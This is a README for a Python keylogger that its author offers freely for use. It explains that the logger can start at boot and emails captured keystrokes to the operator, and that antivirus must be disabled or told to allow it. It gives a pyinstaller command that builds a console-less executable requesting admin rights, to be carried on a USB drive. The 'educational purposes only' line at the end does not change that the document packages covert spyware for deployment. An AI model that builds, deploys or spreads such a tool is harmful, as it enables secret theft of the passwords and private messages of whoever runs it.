# Easy Keylogger  

This is a basic keylogger that I created. Feel free to use it, modify it, or even improve it.  

**Important:** This program works only if the user grants permission to antivirus software or temporarily disables it.  

## How does it work?  
The keylogger **sometimes** starts automatically when the PC boots up. Logged data will be sent to your email address.  

### How to create an executable file (.exe)?  
1. Open **Command Prompt (CMD)**.  
2. Navigate to the target directory using:  
   ```
   cd D:/
   ```
   or the path to the USB or folder where you want to save the .exe file.  
3. Copy the *logger.py* file to your USB drive or preferred location.  
4. Run the following command:  
   ```
   pyinstaller --uac-admin --onefile --noconsole --hidden-import=keyboard logger.py
   ```
5. You will find the .exe file in the "dist" folder, and that's it!  

Feel free to use it, find bugs, or improve it.  

**⚠ This code is for educational purposes only! ⚠**
